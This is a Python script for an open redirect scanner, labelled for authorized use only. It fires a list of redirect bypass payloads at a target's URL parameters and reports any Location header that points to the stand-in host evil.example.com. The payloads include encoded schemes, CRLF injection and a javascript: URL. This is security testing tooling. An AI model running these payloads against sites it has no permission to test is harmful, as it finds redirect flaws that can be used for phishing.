#!/usr/bin/env python3
"""
Open Redirect Scanner — Automated Open Redirect Detection
Tests URL parameters for open redirect vulnerabilities via multiple bypass techniques.
Author: Omar Khalid (amooryx) | github.com/amooryx/open-redirect-scanner
AUTHORIZED USE ONLY.
"""

import argparse
import json
import sys
import urllib.parse
import urllib.request
import urllib.error

EVIL_DOMAIN = "evil.example.com"

REDIRECT_PAYLOADS = [
    "https://{evil}/",
    "http://{evil}/",
    "//{evil}/",
    "https://{evil}@legit.example.com",
    "https://legit.example.com.{evil}/",
    "https://{evil}%2F",
    "https://{evil}%23",
    "%68%74%74%70%73%3a%2f%2f{evil}",        # URL-encoded https://
    "https:%2f%2f{evil}",
    "\nhttps://{evil}",
    "\r\nhttps://{evil}",
    "javascript:window.location='https://{evil}'",
    "https://{evil}?url=legit.example.com",
    "//\t{evil}",
    "https://legit.example.com%40{evil}",
]

REDIRECT_PARAMS = [
    "redirect", "redirect_uri", "redirect_url", "return", "return_url",
    "return_to", "next", "url", "goto", "target", "to", "link",
    "continue", "path", "destination", "dest", "redir", "ref",
    "referer", "location", "forward", "out", "site", "view",
]

def follow_redirect(url: str, timeout: float = 10) -> list[str]:
    """Follow all redirects and return chain of URLs."""
    chain = [url]
    try:
        class RedirectCollector(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, req, fp, code, msg, headers, newurl):
                chain.append(newurl)
                return super().redirect_request(req, fp, code, msg, headers, newurl)
        opener = urllib.request.build_opener(RedirectCollector)
        opener.addheaders = [("User-Agent", "OpenRedirectScanner/1.0")]
        with opener.open(url, timeout=timeout) as resp:
            chain.append(resp.url)
    except Exception:
        pass
    return chain

def test_open_redirect(base_url: str, param: str, payload: str,
                       evil: str, timeout: float) -> dict | None:
    full_payload = payload.format(evil=evil)
    parsed       = urllib.parse.urlparse(base_url)
    qs           = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param]    = [full_payload]
    test_url     = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)))

    try:
        req = urllib.request.Request(test_url)
        req.add_header("User-Agent", "Mozilla/5.0")
        # Don't auto-follow redirects — inspect the Location header
        class NoFollow(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a, **kw): return None
        opener = urllib.request.build_opener(NoFollow)
        with opener.open(req, timeout=timeout) as resp:
            location = resp.headers.get("Location", "")
            if evil in location:
                return {"param": param, "payload": full_payload,
                        "location": location, "status": resp.status,
                        "vulnerable": True}
    except urllib.error.HTTPError as e:
        location = e.headers.get("Location", "") if e.headers else ""
        if evil in location:
            return {"param": param, "payload": full_payload,
                    "location": location, "status": e.code, "vulnerable": True}
    except Exception:
        pass
    return None

def discover_params(url: str) -> list[str]:
    parsed = urllib.parse.urlparse(url)
    return list(urllib.parse.parse_qs(parsed.query).keys())

def main():
    parser = argparse.ArgumentParser(
        description="Open Redirect Scanner — Redirect Vulnerability Detection (Authorized use only)",
    )
    parser.add_argument("url",        help="Target URL")
    parser.add_argument("--params",   nargs="*", help="Parameters to test (auto-detects from URL)")
    parser.add_argument("--evil",     default=EVIL_DOMAIN, help="Evil domain for redirect testing")
    parser.add_argument("--timeout",  type=float, default=8)
    parser.add_argument("--out",      help="Output JSON file")
    args = parser.parse_args()

    params = args.params or discover_params(args.url) or REDIRECT_PARAMS

    jobs = [(args.url, p, pl, args.evil, args.timeout)
            for p in params for pl in REDIRECT_PAYLOADS]
    print(f"[*] Testing {len(params)} params × {len(REDIRECT_PAYLOADS)} payloads = {len(jobs)} combos")

    findings = []
    for url, param, payload, evil, timeout in jobs:
        result = test_open_redirect(url, param, payload, evil, timeout)
        if result:
            print(f"  [!!!] OPEN REDIRECT: param={param}")
            print(f"        payload : {result['payload'][:80]}")
            print(f"        location: {result['location'][:80]}")
            findings.append(result)

    print(f"\n[*] {len(findings)} open redirect vulnerabilities found")
    if args.out:
        with open(args.out, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"[*] Results → {args.out}")

if __name__ == "__main__":
    main()
